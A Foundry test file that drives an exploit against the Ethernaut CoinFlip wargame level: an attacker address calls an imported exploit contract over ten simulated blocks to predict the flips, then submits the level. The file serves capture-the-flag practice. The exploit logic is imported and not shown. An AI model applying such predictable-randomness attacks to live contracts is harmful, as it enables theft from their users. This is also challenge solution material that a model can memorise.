// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/03-CoinFlip/CoinFlipFactory.sol";
import "src/core/Ethernaut.sol";
import "src/levels/03-CoinFlip/CoinFlipExploit.sol";

contract CoinFlipTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;
    CoinFlipExploit coinFlipExploit;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up CoinFlip level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_CoinFlipExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();

        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(eve);

        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip coinFlipContract = CoinFlip(payable(levelAddress));
        coinFlipExploit = new CoinFlipExploit(levelAddress);

        emit log_named_address("Address of the exploit contract: ", address(this));
        emit log_named_address("Eve's address: ", address(eve));

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/
        uint256 consecutiveWins = coinFlipContract.consecutiveWins();
        emit log_named_uint("Eve's score before the attack: ", consecutiveWins);
        emit log_string("Eve runs the exploit for 10 consecutive blocks... 🧨");

        /*
         * we are going to simulate Eve calling the `attack` function
         * 10 times via for loop
         * @param blockNumber is the number of the current block
         * Eve would be waiting for the next block to call the `attack`
         * blockNumber gets incremented
         * Eve repeats the attack
         *
         * we are using vm.roll() to create the next block
         */
        for (uint256 blockNumber = 1; blockNumber <= 10; blockNumber++) {
            vm.roll(blockNumber);
            coinFlipExploit.coinFlipAttack();
            emit log_named_uint("Consecutive wins: ", coinFlipContract.consecutiveWins());
        }

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
        vm.label(addr, name);
        return addr;
    }
}
